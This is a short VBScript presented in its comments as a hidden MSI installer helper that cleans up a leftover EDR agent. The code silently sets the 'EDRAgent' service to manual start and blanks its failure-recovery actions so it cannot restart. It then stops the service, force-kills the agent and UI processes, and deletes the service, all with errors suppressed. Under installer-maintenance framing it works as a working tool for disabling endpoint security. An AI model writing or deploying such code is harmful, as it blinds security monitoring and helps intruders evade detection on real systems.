' Hidden MSI helper: tear down leftover EDRAgent before RemoveExistingProducts /
' StopServices. Old cached MSIs still run Stop="both"; deleting the SCM entry
' here avoids error 1921 even when the service is already stopped.
Option Explicit
On Error Resume Next
Dim sh, sys, i
Set sh = CreateObject("WScript.Shell")
sys = sh.ExpandEnvironmentStrings("%SystemRoot%\System32")
sh.Run """" & sys & "\sc.exe"" config EDRAgent start= demand", 0, True
sh.Run """" & sys & "\sc.exe"" failure EDRAgent reset= 0 actions= //", 0, True
sh.Run """" & sys & "\sc.exe"" stop EDRAgent", 0, True
sh.Run """" & sys & "\taskkill.exe"" /F /IM edr-agent-ui.exe /T", 0, True
sh.Run """" & sys & "\taskkill.exe"" /F /IM edr-agent.exe /T", 0, True
sh.Run """" & sys & "\sc.exe"" delete EDRAgent", 0, True
For i = 1 To 6
  sh.Run """" & sys & "\ping.exe"" -n 2 127.0.0.1", 0, True
Next
